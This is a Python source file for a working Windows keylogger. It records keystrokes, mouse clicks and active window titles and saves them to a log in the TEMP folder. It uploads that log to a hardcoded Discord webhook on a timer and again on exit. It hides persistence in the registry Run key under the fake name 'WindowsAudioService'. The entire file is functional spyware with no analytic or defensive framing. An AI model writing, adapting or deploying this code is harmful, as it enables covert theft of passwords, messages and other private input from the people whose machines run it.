import os
import time
import datetime
import threading
import requests
import sys
import winreg
import ctypes
from pynput import keyboard, mouse
import pygetwindow as gw

click_positions = []
keystrokes = []
window_titles = set()
start_time = time.time()
running = True

date_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_filename = f"session-{date_str}.keylog"
log_path = os.path.join(os.getenv('TEMP'), log_filename)

webhook_url = "https://discord.com/api/webhooks/1383413960090583151/09MBkfrpmH3CxRGKCBFriGfxt0zBM2ZWIjC3wfqDXUOfso2bSApivBwatYqSQU0rG2cZ"

def add_to_startup():
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    exe_path = os.path.abspath(sys.argv[0])
    name = "WindowsAudioService"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            current = winreg.QueryValueEx(key, name)[0]
            if current == exe_path:
                return
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
    except Exception:
        pass

def on_click(x, y, button, pressed):
    if pressed:
        click_positions.append(f"Click {button} at ({x}, {y})")

def on_press(key):
    global running
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(str(key))
    if key == keyboard.Key.esc:
        running = False
        return False

def track_active_window():
    while running:
        try:
            active = gw.getActiveWindow()
            if active and active.title:
                window_titles.add(active.title)
        except:
            pass
        time.sleep(1)

def save_log():
    duration = round(time.time() - start_time, 2)
    try:
        with open(log_path, "w", encoding="utf-8") as f:
            f.write(f"SESSION : {duration} seconds\n\n")
            f.write("== APPS ==\n")
            for title in window_titles:
                f.write(f"- {title}\n")
            f.write("\n== CLICKS ==\n")
            for click in click_positions:
                f.write(f"{click}\n")
            f.write("\n== USED KEYS ==\n")
            for key in keystrokes:
                f.write(f"{key} ")
            f.write("\n")
    except Exception:
        pass

def send_to_discord():
    try:
        with open(log_path, 'rb') as f:
            files = {'file': (os.path.basename(log_path), f)}
            response = requests.post(webhook_url, files=files)
            print(f"[+] LOG SENT. : {response.status_code}")
    except Exception as e:
        print(f"[!] ERROR : {e}")

def periodic_tasks(save_interval=60, send_interval=600):
    last_send = time.time()
    while running:
        save_log()
        if time.time() - last_send >= send_interval:
            send_to_discord()
            last_send = time.time()
        time.sleep(save_interval)

def cleanup_and_exit():
    save_log()
    send_to_discord()
    sys.exit(0)

def ctrl_handler(event_type):
    if event_type in (0, 1, 2, 5, 6):
        cleanup_and_exit()
    return True

def main():
    global running

    add_to_startup()

    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleCtrlHandler(ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)(ctrl_handler), True)

    threading.Thread(target=track_active_window, daemon=True).start()
    threading.Thread(target=periodic_tasks, daemon=True).start()

    mouse_listener = mouse.Listener(on_click=on_click)
    keyboard_listener = keyboard.Listener(on_press=on_press)

    mouse_listener.start()
    keyboard_listener.start()

    keyboard_listener.join()
    mouse_listener.stop()

    cleanup_and_exit()

if __name__ == "__main__":
    main()
